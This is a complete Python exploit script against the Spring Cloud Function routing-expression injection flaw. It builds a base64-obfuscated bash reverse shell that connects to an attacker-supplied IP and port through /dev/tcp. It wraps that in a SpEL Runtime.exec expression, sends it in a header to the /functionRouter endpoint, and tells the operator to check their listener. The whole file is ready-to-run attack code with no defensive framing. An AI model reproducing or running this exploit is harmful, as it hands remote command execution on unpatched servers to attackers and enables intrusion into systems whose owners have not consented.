import sys
import requests
import base64

# Create the payload
def createPayload(target, attackerIp, attackerPort):
    command = f"bash -i >&/dev/tcp/{attackerIp}/{attackerPort} 0>&1"
    command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'
    return payload

# Send the payload
def injection(payload, target):
    header = {'spring.cloud.function.routing-expression': payload}
    path = '/functionRouter'
    target = target + path
    req = requests.post(url=target, headers=header,data="Hello" , verify=False, timeout=3)
    code = req.status_code
    text = req.text
    flag = '"error":"Internal Server Error"'
    if code == 500 and flag in text:
        print("Exploit successfull!")
        print("Check your listener")
    else:
        print("Exploit failed!")


if __name__ == '__main__':

    # Check if the user provided the correct number of command line arguments
    if len(sys.argv) < 4:
        print("Usage: python3 exploit.py <target> <attackerIp> <attackerPort>")
        sys.exit(1)
    
    # Get the target and attacker IP and port from the command line
    target = sys.argv[1]
    attackerIp = sys.argv[2]
    attackerPort = sys.argv[3]

    # Call the exploit function
    payload = createPayload(target, attackerIp, attackerPort)
    injection(payload, target)